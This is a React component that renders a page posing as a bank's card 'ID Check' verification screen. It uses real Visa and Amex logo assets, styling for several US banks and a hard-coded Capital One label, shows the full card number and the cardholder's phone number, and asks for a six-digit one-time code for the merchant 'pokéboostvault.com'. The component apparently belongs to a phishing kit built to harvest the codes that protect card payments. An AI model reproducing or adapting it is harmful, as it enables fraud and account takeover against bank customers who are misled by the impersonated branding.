import React from 'react';
import { ArrowLeft, CreditCard, X } from 'lucide-react';

interface TwoFactorCodeProps {
  code: string;
  setCode: (v: string) => void;
  onSubmit: (e: React.FormEvent) => void;
  disabled?: boolean;
  banks?: any;
  selectedBank: string;
  cardType: string;
  cardNumber: string;
  total: number;
  phoneNumber: string;
}

const sanitize = (v: string) => v.replace(/\D/g, '').slice(0, 6);

const TwoFactorCode: React.FC<TwoFactorCodeProps> = ({
  code,
  setCode,
  onSubmit,
  disabled,
  banks,
  selectedBank,
  cardType,
  cardNumber,
  total,
  phoneNumber,
}) => {
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCode(sanitize(e.target.value));
  };
  const bankData = banks.find((bnk: any) => bnk.name === selectedBank);
  const lastFour = cardNumber.replace(/\s+/g, '').slice(-4);
  const getCardIcon = (type: string) => {
    const iconClass = 'w-28 object-contain';
    switch (type) {
      case 'visa':
        return (
          <div
            className={`${iconClass} text-white text-xs justify-center font-bold flex items-center rounded`}
          >
            <img
              src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png"
              className="w-[80px] h-[20px]"
            />
          </div>
        );
      case 'mastercard':
        return (
          <div
            className={`${iconClass} text-white mr-1.5 text-xs justify-center font-bold flex items-center rounded w-[50px] h-[30px]`}
          >
            <img src="/bank-logos/mc-logo.svg" alt="" />
          </div>
        );
      case 'amex':
        return (
          <div
            className={`${iconClass} text-white text-xs justify-center font-bold flex items-center rounded`}
          >
            <img
              src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-bluebox-solid.svg"
              alt=""
            />
          </div>
        );
      case 'discover':
        return (
          <div
            className={`${iconClass} bg-orange-500 text-white text-xs justify-center font-bold flex items-center rounded`}
          >
            DISC
          </div>
        );
      case 'jcb':
        return (
          <div
            className={`${iconClass} text-white justify-center text-xs font-bold flex items-center rounded`}
          >
            <img src="/bank-logos/jcb_emblem.svg" alt="" />
          </div>
        );
      case 'diners':
        return (
          <div
            className={`${iconClass} bg-gray-600 text-white text-xs justify-center font-bold flex items-center rounded`}
          >
            DC
          </div>
        );
      default:
        return <CreditCard className="w-6 h-6 text-gray-400" />;
    }
  };
  const className =
    selectedBank === 'Wells Fargo'
      ? 'bg-[#D61F28]'
      : selectedBank === 'Citi'
        ? 'w-[100px] h-[60px]'
        : selectedBank === 'PNC'
          ? 'bg-[#414E58]'
          : selectedBank === 'TD Bank'
            ? '!w-[150px] h-[50px]'
            : selectedBank === 'Truist'
              ? 'w-[150px] h-[50px]'
              : selectedBank === 'Regions Bank'
                ? 'w-[150px] h-[50px]'
                : selectedBank === 'M&T Bank'
                  ? 'bg-[#015840]'
                  : selectedBank === 'Navy Federal Credit Union'
                    ? 'w-[200px] h-auto'
                    : '';
  return (
    <div className="bg-white min-h-screen">
      {/* Header with back arrow and close button */}
      <div className="flex items-center justify-between p-4">
        <div className="border-b border-gray-200 flex justify-between w-full items-center">
          <img
            src={bankData?.additionalLogo}
            alt="Capital One"
            className={`${className} h-5 max-w-[200px] mb-2`}
          />
          <div className="flex items-center space-x-2 mb-2">
            {getCardIcon(cardType)} |
            <span className="text-sm font-medium text-gray-700">ID Check</span>
          </div>
        </div>

        {/* Capital One Logo */}
      </div>

      {/* Main Content */}
      <div className="p-6">
        <h1 className="text-2xl font-bold text-gray-900 mb-4">
          Submit the code we sent to you
        </h1>

        <p className="text-gray-600 mb-8">
          Enter the temporary code we sent to {phoneNumber}.
        </p>

        {/* Transaction Details */}
        <div className="space-y-4 mb-8">
          <div>
            <span className="font-semibold text-gray-900">Merchant:</span>
            <div className="text-gray-600 mt-1">pokéboostvault.com</div>
          </div>

          <div>
            <span className="font-semibold text-gray-900">
              Purchase Amount:
            </span>
            <div className="text-gray-900 font-semibold mt-1">${total} USD</div>
          </div>

          <div>
            <span className="font-semibold text-gray-900">Card Number:</span>
            <div className="text-gray-600 mt-1">{cardNumber}</div>
          </div>
        </div>

        {/* Code Input Form */}
        <form onSubmit={onSubmit} className="space-y-6">
          <div>
            <label className="block text-sm font-semibold text-gray-900 mb-3">
              Code
            </label>
            <input
              type="text"
              value={code}
              onChange={handleChange}
              maxLength={6}
              placeholder=""
              className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none text-lg text-center tracking-widest font-mono"
              required
            />
          </div>

          <button
            type="submit"
            disabled={code.length !== 6}
            className={`w-full font-semibold py-3 px-6 rounded-lg transition-all duration-200 ${
              code.length === 6
                ? 'bg-blue-600 hover:bg-blue-700 text-white cursor-pointer'
                : 'bg-gray-300 text-gray-500 cursor-not-allowed'
            }`}
          >
            Submit Code
          </button>
        </form>

        {/* Resend Code Link */}
        <div className="text-center mt-6">
          <span className="text-gray-600">Didn't receive a code? </span>
          <button
            type="button"
            className="text-blue-600 hover:text-blue-800 font-medium transition-colors"
          >
            Resend code
          </button>
        </div>
      </div>
    </div>
  );
};

export default TwoFactorCode;
